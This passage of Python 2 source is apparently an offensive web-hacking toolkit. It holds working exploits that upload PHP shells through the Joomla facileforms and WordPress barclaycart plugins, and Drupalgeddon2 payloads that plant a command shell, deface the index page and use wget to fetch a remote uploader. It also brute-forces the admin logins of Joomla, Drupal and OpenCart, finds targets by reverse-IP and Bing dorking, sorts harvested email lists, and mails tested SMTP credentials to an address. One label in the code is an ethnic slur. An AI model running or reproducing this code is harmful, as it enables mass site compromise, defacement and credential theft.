                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Com_jwallpapers_index(site)
                elif 'Vuln!!' in Check3.text.encode('utf-8'):
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/payload3.php' + '\n')
                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Com_jwallpapers_index(site)
                else:
                    self.Com_jwallpapers_index(site)
        except:
            self.Com_jwallpapers_index(site)


    def Com_facileforms(self, site):
        Check = requests.get('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                             timeout=10)
        if Check.status_code == 200 or Check.status_code == 500:
            IndeX = {'Filedata': open(self.Jce_Deface_image, 'rb')}
            ShellFile = {'Filedata': open(self.ShellPresta, 'rb')}
            Datapost = {'folder': '/components/com_facileforms/libraries/jquery/'}
            requests.post('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                                files=ShellFile, data=Datapost, timeout=10)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_facileforms/libraries/jquery/up.php', timeout=5)

            if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                self.Print_vuln_Shell(site + '/components/com_facileforms/libraries/jquery/up.php')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/components/com_facileforms/libraries/jquery/up.php\n')
            else:
                requests.post('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                              files=IndeX, data=Datapost, timeout=10)

                CheckIndex = requests.get('http://' + site + '/components/com_facileforms/libraries/jquery/'
                                          + self.Jce_Deface_image.split('/')[1])
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/components/com_facileforms/libraries/jquery/'
                                          + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/components/com_facileforms/libraries/jquery/'
                                     + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_facileforms', site)
        else:
            self.Print_NotVuln('Com_facileforms', site)

    def barclaycart(self, site):
        try:
            ShellFile = {'Filedata': (self.pagelinesExploitShell, open(self.pagelinesExploitShell, 'rb')
                                  , 'multipart/form-data')}
            Exp = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/uploadify.php'
            requests.post(Exp, files=ShellFile, timeout=5)
            Shell = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/' \
                    + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(Shell, timeout=5)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                    self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/payload3.php' + '\n')
                if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/br4in.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/br4in.htm' + '\n')
                else:
                    self.Print_NotVuln('barclaycart plugin', site)
            else:
                self.Print_NotVuln('barclaycart plugin', site)
        except:
            self.Print_NotVuln('barclaycart plugin', site)



    class DrupalGedden2(object):
        def __init__(self, site):
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            try:
                CheckVersion = requests.get('http://' + site, timeout=5)
                if 'content="Drupal 7' in CheckVersion.text.encode('utf-8'):
                    self.Version7Drupal(site)
                elif 'content="Drupal 8' in CheckVersion.text.encode('utf-8'):
                    self.Version8Drupal(site)
                else:
                    self.Version7Drupal(site)
            except:
                self.Print_NotVuln('Drupalgeddon2', site)

        def Print_NotVuln(self, NameVuln, site):
            print self.c + '       [' + self.y + '-' + self.c + '] ' + self.r + site + ' ' + self.y + NameVuln + self.c + ' [Not Vuln]'

        def Print_Vuln_index(self, indexPath):
            print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + indexPath + self.g + ' [Index Uploaded!]'

        def Print_vuln_Shell(self, shellPath):
            print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + shellPath + self.g + ' [Shell Uploaded!]'

        def Version7Drupal(self, site):
            try:
                payloadshell = "Vuln!!<?php system($_GET['cmd']); ?>"
                PrivatePAyLoad = "echo 'Vuln!! patch it Now!' > br4in.htm;" \
                             " echo '" + payloadshell + "'> sites/default/files/payload3.php;" \
                                                        " echo '" + payloadshell + "'> payload3.php;" \
                                                        " cd sites/default/files/;" \
                                                        " echo 'AddType application/x-httpd-php .jpg' > .htaccess;" \
                                                        " wget 'https://raw.githubusercontent.com/Cod3D-Br4in/test1/master/up.php'"
                get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                              'name[#markup]': PrivatePAyLoad, 'name[#type]': 'markup'}
                post_params = {'form_id': 'user_pass', '_triggering_element_name': 'name'}

                r = requests.post('http://' + site, data=post_params, params=get_params)
                m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
                if m:
                    found = m.group(1)
                    get_params = {'q': 'file/ajax/name/#value/' + found}
                    post_params = {'form_build_id': found}
                    requests.post('http://' + site, data=post_params, params=get_params)
                    a = requests.get('http://' + site + '/sites/default/files/payload3.php', timeout=5)
                    if 'Vuln!!' in a.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/sites/default/files/payload3.php?cmd=id')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/sites/default/files/payload3.php?cmd=id' + '\n')
                        gg = requests.get('http://' + site + '/br4in.htm', timeout=5)
                        CheckUploader = requests.get('http://' + site + '/sites/default/files/up.php', timeout=5)
                        if 'Vuln!!' in CheckUploader.text.encode('utf-8'):
                            self.Print_vuln_Shell(site + '/sites/default/files/up.php')
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/sites/default/files/up.php' + '\n')
                        if 'Vuln!!' in gg.text.encode('utf-8'):
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/br4in.htm' + '\n')
                    else:
                        gg = requests.get('http://' + site + '/br4in.htm', timeout=5)
                        if 'Vuln!!' in gg.text.encode('utf-8'):
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/br4in.htm' + '\n')
                            Checkshell = requests.get('http://' + site + '/payload3.php', timeout=5)
                            if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                                self.Print_vuln_Shell(site + '/payload3.php?cmd=id')
                                with open('result/Shell_results.txt', 'a') as writer:
                                    writer.write(site + '/payload3.php?cmd=id' + '\n')
                        else:
                            self.Print_NotVuln('Drupalgeddon2', site)
                else:
                    self.Print_NotVuln('Drupalgeddon2', site)
            except:
                self.Print_NotVuln('Drupalgeddon2 Timeout!', site)

        def Version8Drupal(self, site):
            try:
                Exp = site + '/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                payloadshell = "<?php system($_GET['cmd']); ?>"

                payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                           'mail[#type]': 'markup', 'mail[#markup]': 'echo Vuln!! patch it Now!> br4in.htm'}

                payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                            'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + payloadshell + '"> payload3.php'}
                r = requests.post('http://' + Exp, data=payload, timeout=5)
                if r.status_code == 200:
                    a = requests.get('http://' + site + '/br4in.htm', timeout=5)
                    if 'Vuln!!' in a.text.encode('utf-8'):
                        requests.post('http://' + Exp, data=payload2, timeout=5)
                        CheckShell = requests.get('http://' + site + '/payload3.php', timeout=5)
                        if CheckShell.status_code == 200:
                            self.Print_vuln_Shell(site + '/payload3.php?cmd=id')
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/payload3.php?cmd=id' + '\n')
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/br4in.htm' + '\n')
                        else:
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Print_NotVuln('Drupalgeddon2', site)
                else:
                    self.Print_NotVuln('Drupalgeddon2', site)
            except:
                self.Print_NotVuln('Drupalgeddon2 Timeout!', site)



    class JooMLaBruteForce(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.Joomla, args=(site, passwd))
                if self.flag == 0:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print self.c + '       [' + self.y + '-' + self.c + '] ' + self.r + site + ' ' \
                      + self.y + 'Joomla BruteForce' + self.c + ' [Not Vuln]'

        def Joomla(self, site, passwd):
            try:
                sess = requests.session()
                GetToken = sess.get('http://' + site + '/administrator/index.php', timeout=5)
                try:
                    ToKeN = re.findall('type="hidden" name="(.*)" value="1"',
                                       GetToken.text.encode('utf-8'))[0]
                    GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', GetToken.text.encode('utf-8'))[0]
                except:
                    ToKeN = ''
                    GeTOPtIoN = 'com_login'
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post = {}
                post['username'] = "admin"
                post['passwd'] = passwd
                post['lang'] = 'en-GB'
                post['option'] = GeTOPtIoN
                post['task'] = 'login'
                post[ToKeN] = '1'
                url = "http://" + site + "/administrator/index.php"
                GoT = sess.post(url, data=post, headers=agent, timeout=10)
                if 'logout' in GoT.text.encode('utf-8'):
                    print self.c + '       [' + self.y + '+' + self.c + '] ' +\
                          self.r + site + ' ' + self.y + 'Joomla' + self.g + ' [Hacked!!]'
                    with open('result/Joomla_Hacked.txt', 'a') as writer:
                        writer.write('http://' + site + '/administrator/index.php' + '\n Username: admin' +
                                     '\n Password: ' + passwd + '\n-----------------------------------------\n')
                    self.flag = 1
            except Exception, e:
                pass

    class DrupalBruteForce(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.Drupal, args=(site, passwd))
                if self.flag == 0:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print self.c + '       [' + self.y + '-' + self.c + '] ' + self.r + site + ' ' \
                      + self.y + 'Drupal BruteForce' + self.c + ' [Not Vuln]'

        def Drupal(self, site, passwd):
            try:
                sess = requests.session()
                GetToken = sess.get('http://' + site + '/user/login', timeout=5)
                try:
                    GetOP = re.findall('id="edit-submit" name="op" value="(.*)"',
                                       GetToken.text.encode('utf-8'))[0].split('"')[0]
                except:
                    GetOP = 'Log in'
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post = {}
                post['name'] = "admin"
                post['pass'] = passwd
                post['form_id'] = 'user_login'
                post['op'] = GetOP
                url = "http://" + site + "/user/login"
                GoT = sess.post(url, data=post, headers=agent, timeout=10)
                if 'Log out' in GoT.text.encode('utf-8'):
                    print self.c + '       [' + self.y + '+' + self.c + '] ' +\
                          self.r + site + ' ' + self.y + 'Drupal' + self.g + ' [Hacked!!]'
                    with open('result/Drupal_Hacked.txt', 'a') as writer:
                        writer.write('http://' + site + '/user/login' + '\n Username: admin' + '\n Password: ' +
                                     passwd + '\n-----------------------------------------\n')
                    self.flag = 1

            except Exception, e:
                pass

    class OpenCart(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.opencart, args=(site, passwd))
                if self.flag == 0:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print self.c + '       [' + self.y + '-' + self.c + '] ' + self.r + site + ' ' \
                      + self.y + 'OpenCart' + self.c + ' [Not Vuln]'

        def opencart(self, site, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post = {}
                post['username'] = "admin"
                post['password'] = passwd
                url = "http://" + site + "/admin/index.php"
                GoT = requests.post(url, data=post, headers=agent, timeout=10)
                if 'Logout' in GoT.text.encode('utf-8'):
                    print self.c + '       [' + self.y + '+' + self.c + '] ' +\
                          self.r + site + ' ' + self.y + 'OpenCart' + self.g + ' [Hacked!!]'
                    with open('result/OpenCart_Hacked.txt', 'a') as writer:
                        writer.write('http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' +
                                     passwd + '\n-----------------------------------------\n')
                    self.flag = 1
            except Exception, e:
                pass
class reverse_ipz(object):
    def __init__(self):
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                   'Accept': '*/*'}
    def Reverse_ip(self, domain_Or_ipAddress):

        Check = domain_Or_ipAddress
        if Check.startswith("http://"):
            Check = Check.replace("http://", "")
        elif Check.startswith("https://"):
            Check = Check.replace("https://", "")
        else:
            pass
        try:
            self.ip = socket.gethostbyname(Check)
        except:
            sys.exit()
        Rev = requests.get(binascii.a2b_base64('aHR0cDovL3ZpZXdkbnMuaW5mby9yZXZlcnNlaXAvP2hvc3Q9') + self.ip + '&t=1',
                           headers=self.headers, timeout=5)
        Revlist = re.findall('<tr> <td>((([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}))</td>', Rev.text)
        if len(Revlist) == 1000:
            for url in Revlist:
                with open('logs/' + self.ip + 'x.txt', 'a') as xx:
                    xx.write(str(url[0]) + '\n')
            gotoBing = BingDorker()
            gotoBing.ip_bing(self.ip)
        else:
            for url in Revlist:
                with open('logs/' + self.ip + '.txt', 'a') as xx:
                    xx.write(str(url[0]) + '\n')
class BingDorker(object):
    def ip_bing(self, __ip):
        try:
            if __ip.startswith("http://"):
                __ip = __ip.replace("http://", "")
            elif __ip.startswith("https://"):
                __ip = __ip.replace("https://", "")
            else:
                pass
            try:
                ip = socket.gethostbyname(__ip)
            except:
                sys.exit()
            next = 0
            while next <= 500:
                url = "http://www.bing.com/search?q=ip%3A" + ip + "&first=" + str(next) + "&FORM=PORE"
                sess = requests.session()
                cnn = sess.get(url, timeout=5)
                next = next + 10
                finder = re.findall(
                    '<h2><a href="((?:https://|http://)[a-zA-Z0-9-_]+\.*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11})',
                    cnn.text)
                for url in finder:
                    if url.startswith('http://'):
                        url = url.replace('http://', '')
                    elif url.startswith('https://'):
                        url = url.replace('https://', '')
                    else:
                        pass
                    with open("logs/" + ip + "x.txt", 'a') as f:
                        if 'go.microsoft.com' in url:
                            pass
                        else:
                            f.write(str(url + '\n'))
            lines = open("logs/" + ip + "x.txt", 'r').read().splitlines()
            lines_set = set(lines)
            count = 0
            for line in lines_set:
                with open("logs/" + ip + ".txt", 'a') as xx:
                    count = count + 1
                    xx.write(line + '\n')
            os.unlink("logs/" + ip + "x.txt")
        except IOError:
            sys.exit()
        except IndexError:
            sys.exit()
def tommy():
   print(''' ____  __  __    _  _   __   __  __   
(  __)(  )(  )  ( \/ ) / _\ (  )(  )  
 ) _)  )( / (_/\/ \/ \/    \ )( / (_/\
 
(__)  (__)\____/\_)(_/\_/\_/(__)\____/
    
	(Fil)=Filtre (mail)=Emails
''')
   nb=0
   notmail=0
   Yahoo=0
   Mailru=0
   inboxru=0
   bkru=0
   hotmail=0
   live=0
   outlook=0
   seznamcz=0
   gmail=0
   orangefr=0
   yandex=0
   gmx=0
   TunisienShitt=0
   aol=0
   freefr=0
   rambler=0
   citromailhu=0
   cncom=0
   Freenetde=0
   freemailhu=0
   abv=0
   tonlinede=0
   op=0
   onet=0
   vp=0
   other=0
   burn =str(raw_input("%s[%s+%s] Enter list : %s"%(la7mar,la5dhar,la7mar,lazra9)))
   if not os.path.isdir('results/filtres'):
    os.mkdir('results/filtres')
   with open(burn, 'r') as earth:
      file = earth.read().splitlines()
   for fade in file:
    fade=fade.lower()
    nb=nb+1
    try:
     if '@' not in str(fade):
        notmail=notmail+1
     elif '@yahoo.' in str(fade):
        Yahoo=Yahoo+1
        zzz=open('results/filtres/yahoo.txt','a')
        zzz.write(fade+'\n')
     elif '@mail.ru' in str(fade):
        Mailru=Mailru+1
     elif  '@inbox.ru' in str(fade):
        inboxru=inboxru+1
        zzz=open('results/filtres/inbox.ru.txt','a')
        zzz.write(fade+'\n')
     elif  '@bk.ru' in str(fade):
        bkru=bkru+1
        zzz=open('results/filtres/bk.ru.txt','a')
        zzz.write(fade+'\n')
     elif  '@hotmail' in str(fade):
        hotmail=hotmail+1
        zzz=open('results/filtres/hotmail.txt','a')
        zzz.write(fade+'\n')
     elif  '@live' in str(fade):
        live=live+1
        zzz=open('results/filtres/live.txt','a')
        zzz.write(fade+'\n')
     elif  '@outlook' in str(fade):
        outlook=outlook+1
        zzz=open('results/filtres/outlook.txt','a')
        zzz.write(fade+'\n')
     elif '@seznam.cz' in str(fade):
        seznamcz=seznamcz+1
        zzz=open('results/filtres/seznam.cz.txt','a')
        zzz.write(fade+'\n')
     elif '@gmail.com' in str(fade):
        gmail=gmail+1
        zzz=open('results/filtres/gmail.com.txt','a')
        zzz.write(fade+'\n')
     elif '@orange.' in str(fade):
        orangefr=orangefr+1
        zzz=open('results/filtres/orange.fr.txt','a')
        zzz.write(fade+'\n')
     elif '@yandex.' in str(fade):
        yandex=yandex+1
        zzz=open('results/filtres/yandex.txt','a')
        zzz.write(fade+'\n')
     elif '@gmx.' in str(fade):
        gmx=gmx+1
        zzz=open('results/filtres/gmx.txt','a')
        zzz.write(fade+'\n')
     elif '.tn' in str(fade):
        TunisienShitt=TunisienShitt+1
        zzz=open('results/filtres/tona.txt','a')
        zzz.write(fade+'\n')
     elif '@aol.' in str(fade):
        aol=aol+1
        zzz=open('results/filtres/aol.txt','a')
        zzz.write(fade+'\n')
     elif '@free.fr' in str(fade):
        freefr=freefr+1
        zzz=open('results/filtres/free.fr.txt','a')
        zzz.write(fade+'\n')
     elif '@rambler.' in str(fade):
        rambler=rambler+1
        zzz=open('results/filtres/rambler.txt','a')
        zzz.write(fade+'\n')
     elif '@citromail.hu' in str(fade):
        citromailhu=citromailhu+1
        zzz=open('results/filtres/citromail.txt','a')
        zzz.write(fade+'\n')
     elif '@21cn.com' in str(fade):
        cncom=cncom+1
        zzz=open('results/filtres/21cn.com.txt','a')
        zzz.write(fade+'\n')
     elif '@freenet.de' in str(fade):
        Freenetde=Freenetde+1
        zzz=open('results/filtres/freenet.de.txt','a')
        zzz.write(fade+'\n')
     elif '@freemail.hu' in str(fade):
        freemailhu=freemailhu+1
        zzz=open('results/filtres/freemail.hu.txt','a')
        zzz.write(fade+'\n')
     elif '@abv.bg' in str(fade):
        abv=abv+1
        zzz=open('results/filtres/abv.bg.txt','a')
        zzz.write(fade+'\n')
     elif '@t-online.de' in str(fade):
        tonlinede=tonlinede+1
        zzz=open('results/filtres/t.online.txt','a')
        zzz.write(fade+'\n')
     elif '@op.' in str(fade):
        op=op+1
        zzz=open('results/filtres/op.txt','a')
        zzz.write(fade+'\n')
     elif '@onet.' in str(fade):
        onet=onet+1
        zzz=open('results/filtres/onet.txt','a')
        zzz.write(fade+'\n')
     elif '@vp' in str(fade):
        vp=vp+1
        zzz=open('results/filtres/vp.txt','a')
        zzz.write(fade+'\n')
     else:
        other=other+1
        zzz=open('results/filtres/other.txt','a')
        zzz.write(fade+'\n')
    except:
            pass
   nouwa=Yahoo+Mailru+inboxru+bkru+hotmail+live+outlook+seznamcz+gmail+orangefr+yandex+gmx+TunisienShitt+aol+freefr+rambler+citromailhu+cncom+Freenetde+freemailhu+abv+tonlinede+op+onet+vp+other
   print"%s   [%s+%s] %sTotal Emails : %s"%(la7mar,lazra9,la7mar,la5dhar,nouwa)
   fitromailon(Yahoo, 'Yahoo')
   fitromailon(Mailru, 'Mail.ru')
   fitromailon(inboxru, 'Inbox.ru')
   fitromailon(bkru, 'bk.ru')
   fitromailon(hotmail, 'Hotmail')
   fitromailon(live, 'Live')
   fitromailon(outlook, 'Outlook')
   fitromailon(seznamcz, 'seznam.cz')
   fitromailon(gmail, 'Gmail')
   fitromailon(orangefr, 'Orange.fr')
   fitromailon(yandex, 'Yandex')
   fitromailon(gmx, 'Gmx')
   fitromailon(TunisienShitt, 'Tunisien Shits')
   fitromailon(aol, 'Aol')
   fitromailon(freefr, 'Free.fr')
   fitromailon(citromailhu,'citromailhu')
   fitromailon(rambler, 'Rambler')
   fitromailon(cncom, '21cn.com')
   fitromailon(Freenetde, 'Freenetde')
   fitromailon(freemailhu, 'Freemail.hu')
   fitromailon(abv, 'Abv.bg')
   fitromailon(tonlinede, 'T-online.de')
   fitromailon(op, 'op')
   fitromailon(onet, 'Onet')
   fitromailon(vp, 'Vp')
   fitromailon(other, 'Speciel Domains')
   fitromailon(notmail, 'Not E-Mail')
def tee1 ():
 print("""\n\033[91m...####...##...##..######..#####......######..######...####...######..######..#####..
...####...##...##..######..#####......######..######...####...######..######..#####..
 .##......###.###....##....##..##.......##....##......##........##....##......##..##.
 ..####...##.#.##....##....#####........##....####.....####.....##....####....#####..
 .....##..##...##....##....##...........##....##..........##....##....##......##..##.
 ..####...##...##....##....##__________.##....######...####.....##....######..##..##.
 ...........................|MegaBot|............................................by ARON-tn & YassineHd\033[0m""")
 fromaddress = 'MegaBot BOT'
 toaddress = raw_input("Your Email : ")
 text = 'G00D JOB SMTP WORK 100% BiG RZLT Nshala'
 username = raw_input("\nEmail SMTP : ")
 password = raw_input("\nSmtp PassWord : ")
 se = raw_input("\nSmtp server : ")
 p = raw_input ("\nport Plz :")
 t3 = '\nmail is :\n'
 t2 = username
 t1 = '\npassword is :\n'
 t0 = password
 t4 = '\nSmtp Server (Host) is :\n'
 t7 = se
 t5 = '\nPort Is :\n'
 t = p
 msg = MIMEMultipart()
 msg['From'] =fromaddress
 msg['To'] = toaddress
 msg['Subject'] = text
 msg.attach(MIMEText(t3))
 msg.attach(MIMEText(t2))
 msg.attach(MIMEText(t1))
 msg.attach(MIMEText(t0))
 msg.attach(MIMEText(t4))
 msg.attach(MIMEText(t7))
 msg.attach(MIMEText(t5))
 msg.attach(MIMEText(t))
 server = smtplib.SMTP(se , p)
 server.ehlo()
 server.starttls()
 server.ehlo()
 server.login(username,password)
 server.sendmail(fromaddress,toaddress,msg.as_string())
 server.quit()
 print ("Mail successfully sended to " + toaddress)
 raw_input("Press Enter return to menu ")
def t3():
 class Dorker(object):
     def __init__(self):
         self.cls()
         try:
             os.mkdir('logs')
         except:
             pass
         try:
             os.mkdir('results')
         except:
             pass
         self.concurrent = 500
         self.r = '\033[31m'
         self.g = '\033[32m'
         self.y = '\033[33m'
         self.b = '\033[34m'
         self.m = '\033[35m'
         self.c = '\033[36m'
         self.w = '\033[37m'
         self.rr = '\033[39m'
         self.Header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
         self.domains = ['ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
                         'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
                         'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
                         'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
                         'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
                         'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
                         'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
                         'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
                         'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
                         'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
                         'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'is', 'it',
                         'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
                         'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
                         'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
                         'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
                         'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
                         'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
                         'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
                         'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
                         'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
                         'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
                         'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
                         'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
                         'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
                         'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw', 'com',
                         'net', 'org', 'biz', 'gov', 'mil', 'edu', 'info', 'int', 'tel',
                         'name', 'aero', 'asia', 'cat', 'coop', 'jobs', 'mobi', 'museum',
                         'pro', 'travel']
         try:
             self.Get_list = raw_input(self.r + '    [+]' + self.c + ' Enter List Dork: ' + self.y)
         except IOError:
             print self.r + '--------------------------------------------'
             print self.r + '    [' + self.y + '-' + self.r + '] ' + self.c + ' List Not Found in Directory!'
             sys.exit()
         self.q = Queue(self.concurrent * 2)
         for i in range(self.concurrent):
             self.t = threading.Thread(target=self.doWork)
             self.t.daemon = True
             self.t.start()
         try:
             for url in open(self.Get_list):
                 self.q.put(url.strip())
             self.q.join()
         except:
             sys.exit()
     def cls(self):
         linux = 'clear'
         windows = 'cls'
         os.system([linux, windows][os.name == 'nt'])
     def cur_execute(self, data, args=()):
         connection = sqlite3.connect("Database.sqlite3")
         with connection:
             cur = connection.cursor()
             cur.execute(data, args)
             connection.commit()
     def duplicate_remover(self, x):
         urls3 = glob.glob(x)
         domains = {}
         for line in urls3:
             with open(line, "r") as infile:
                 for line1 in infile:
                     if line1.startswith("http://"):
                         line1 = line1.replace("http://", "")
                     elif line1.startswith("https://"):
                         line1 = line1.replace("https://", "")
                     else:
                         pass
                     x = 'http://' + line1
                     parse = urlparse(x)
                     domains[parse[1]] = line1
             with open('results/MyBeSqliVulnLists.txt', "a") as outfile:
                 for line1 in domains:
                     outfile.write(domains[line1])
             domains.clear()
         os.unlink('results/MyBeSqliVulnList.txt')
 
     def doWork(self):
